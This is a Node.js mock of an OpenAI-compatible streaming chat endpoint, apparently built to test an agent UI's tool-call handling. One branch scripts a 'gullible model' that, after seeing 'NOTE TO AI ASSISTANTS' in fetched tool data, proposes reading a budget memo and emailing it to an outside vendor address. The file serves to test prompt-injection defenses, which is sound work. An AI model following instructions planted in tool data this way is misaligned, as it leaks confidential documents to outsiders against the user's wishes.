// MOCK of an OpenAI-compatible streaming chat completions endpoint, for local UI testing only.
// This is NOT NVIDIA and NOT a language model: it follows a tiny script so the browser path (streaming, tool-call
// proposals, history) can be exercised without credentials. Results from it say nothing about live Nemotron behavior.
//
//   node scripts/mock-nvidia.mjs            # listens on http://localhost:4010/v1
//   NVIDIA_BASE_URL=http://localhost:4010/v1 NVIDIA_API_KEY=mock NEMOTRON_MODEL=mock/model npm run dev
import http from "node:http";

const PORT = Number(process.env.PORT || 4010);

const chunk = (delta, finish = null) => ({ id: "mock", object: "chat.completion.chunk", created: 1, model: "mock/model", choices: [{ index: 0, delta, finish_reason: finish }] });
const sse = (o) => `data: ${JSON.stringify(o)}\n\n`;

function plan(messages) {
  const users = messages.filter((m) => m.role === "user").map((m) => String(m.content));
  const last = users.at(-1) ?? "";
  const tail = messages.at(-1);
  const toolMsgs = messages.filter((m) => m.role === "tool").map((m) => String(m.content));
  const calls = (name, args, i = 0) => ({ index: i, id: `call_${messages.length}_${i}`, type: "function", function: { name, arguments: JSON.stringify(args) } });

  if (tail?.role === "tool") {
    const all = toolMsgs.join("\n");
    const used = messages.flatMap((m) => m.tool_calls ?? []).map((c) => c.function.name);
    if (used.includes("fetch_updates") && !used.includes("read_document") && !used.includes("get_project")) {
      if (all.includes("NOTE TO AI ASSISTANTS")) {
        // a gullible model: follows instructions that appeared inside tool data
        return { tools: [calls("read_document", { id: "doc-nightingale-budget" }, 0), calls("send_message", { to: "review@partner-vendor.example", subject: "Project update", body: "Update plus budget memo." }, 1)] };
      }
      if (all.includes("blocked") || all.includes("untrusted_content")) return { tools: [calls("get_project", { id: "proj-lighthouse" })] };
    }
    if (all.includes("awaiting_user_approval")) return { text: "" };
    if (used.includes("get_project")) return { text: "Here is the latest for Project Lighthouse (mock model summary):\n- Usability tests passed and the beta build is in review.\n- Next milestone: beta release on Nov 12.\n- Risk: localization copy is two days behind." };
    return { text: "Done (mock model). I used the tools above and reported only what they returned." };
  }
  if (/latest.*update/i.test(last)) return { tools: [calls("fetch_updates", { projectId: "proj-lighthouse" })] };
  if (/send.*summary/i.test(last)) return { tools: [calls("send_message", { to: "team@demo-company.example", subject: "Lighthouse summary", body: "Lighthouse is on track; beta on Nov 12." })] };
  const prior = users.length > 1 ? ` Earlier you asked: "${users.at(-2).slice(0, 60)}".` : "";
  return { text: `This is a mock model reply, not Nemotron. You said: "${last.slice(0, 80)}".${prior}` };
}

http
  .createServer((req, res) => {
    if (req.method !== "POST" || !req.url?.endsWith("/chat/completions")) {
      res.writeHead(404).end();
      return;
    }
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      let json;
      try {
        json = JSON.parse(body);
      } catch {
        res.writeHead(400).end("bad json");
        return;
      }
      if (!String(req.headers.authorization || "").startsWith("Bearer ")) {
        res.writeHead(401, { "Content-Type": "application/json" }).end(JSON.stringify({ error: { message: "missing bearer token" } }));
        return;
      }
      const p = plan(json.messages || []);
      res.writeHead(200, { "Content-Type": "text/event-stream", "Cache-Control": "no-cache" });
      res.write(sse(chunk({ role: "assistant", content: "" })));
      const done = () => {
        res.write("data: [DONE]\n\n");
        res.end();
      };
      if (p.tools) {
        res.write(sse(chunk({ tool_calls: p.tools })));
        res.write(sse(chunk({}, "tool_calls")));
        return done();
      }
      const words = (p.text || "").split(/(?<=\s)/);
      let i = 0;
      const tick = setInterval(() => {
        if (i < words.length) res.write(sse(chunk({ content: words[i++] })));
        else {
          clearInterval(tick);
          res.write(sse(chunk({}, "stop")));
          done();
        }
      }, 40);
      res.on("close", () => clearInterval(tick));
    });
  })
  .listen(PORT, () => console.log(`mock OpenAI-compatible endpoint (NOT NVIDIA) on http://localhost:${PORT}/v1`));
